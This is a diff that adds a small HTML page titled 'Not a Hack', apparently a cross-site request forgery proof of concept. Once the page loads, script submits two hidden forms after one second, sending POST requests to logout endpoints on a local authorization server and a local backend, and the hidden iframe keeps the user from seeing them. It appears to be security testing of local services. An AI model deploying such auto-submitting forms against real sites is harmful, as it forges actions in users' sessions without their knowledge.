@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Not a Hack</title>
+    <style>
+        body {
+          font-family: sans-serif;
+          text-align: center;
+          margin-top: 100px;
+          background-color: #f9f9f9;
+          color: #444;
+        }
+        h1 {
+          color: #b22222;
+        }
+        iframe {
+          display: none;
+          width: 1px;
+          height: 1px;
+        }
+    </style>
+</head>
+<body>
+<h1>You are definitely not being hacked right now.</h1>
+<p>Just sit back and enjoy the ride. 😎</p>
+
+<iframe name="hiddenFrame"></iframe>
+
+<form id="authzLogoutForm" action="http://localhost:9000/logout" method="POST" target="hiddenFrame">
+</form>
+<form id="bffLogoutForm" action="http://127.0.0.1.nip.io:9443/logout" method="POST" target="hiddenFrame">
+</form>
+<script>
+    setTimeout(() => {
+      document.getElementById('authzLogoutForm').submit();
+    }, 1000);
+    setTimeout(() => {
+      document.getElementById('bffLogoutForm').submit();
+    }, 1000);
+</script>
+</body>
+</html>
